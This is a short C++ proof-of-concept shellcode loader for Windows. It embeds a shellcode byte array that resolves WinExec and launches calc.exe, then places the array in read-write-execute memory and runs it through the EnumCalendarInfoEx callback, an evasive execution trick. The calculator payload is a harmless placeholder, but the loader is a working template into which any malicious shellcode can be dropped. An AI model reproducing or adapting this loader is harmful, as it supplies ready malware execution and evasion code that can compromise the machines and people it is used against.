#include <Windows.h>

// alfarom256 calc shellcode
unsigned char op[] =
"\x55\x8b\xec\x83\xec\x20\x64\xa1\x30\x00\x00\x00\x8b\x40"
"\x0c\x8b\x40\x1c\x8b\x00\x8b\x00\x8b\x40\x08\xc7\x45\xfc"
"\x00\x00\x00\x00\xc7\x45\xf8\x00\x00\x00\x00\xc7\x45\xf4"
"\x00\x00\x00\x00\x8b\x58\x3c\x8d\x1c\x03\x8b\x5b\x78\x8d"
"\x14\x03\x8b\x5a\x1c\x8d\x1c\x03\x89\x5d\xfc\x8b\x5a\x20"
"\x8d\x1c\x03\x89\x5d\xf8\x8b\x5a\x24\x8d\x1c\x03\x89\x5d"
"\xf4\x8b\x7a\x18\x33\xc9\x8b\x75\xf8\x8b\x1c\x8e\x8d\x1c"
"\x03\x8b\x1b\x81\xfb\x57\x69\x6e\x45\x74\x03\x41\xeb\xed"
"\x8b\x5d\xf4\x33\xd2\x66\x8b\x14\x4b\x8b\x5d\xfc\x8b\x1c"
"\x93\x8d\x04\x03\xeb\x09\x63\x61\x6c\x63\x2e\x65\x78\x65"
"\x00\xe8\x00\x00\x00\x00\x5b\x83\xeb\x0e\x6a\x05\x53\xff"
"\xd0\x8b\xe5\x5d\xc3";


int main() {
    LPVOID addr = ::VirtualAlloc(nullptr, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, op, sizeof(op));
    ::EnumCalendarInfoEx((CALINFO_ENUMPROCEX)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
}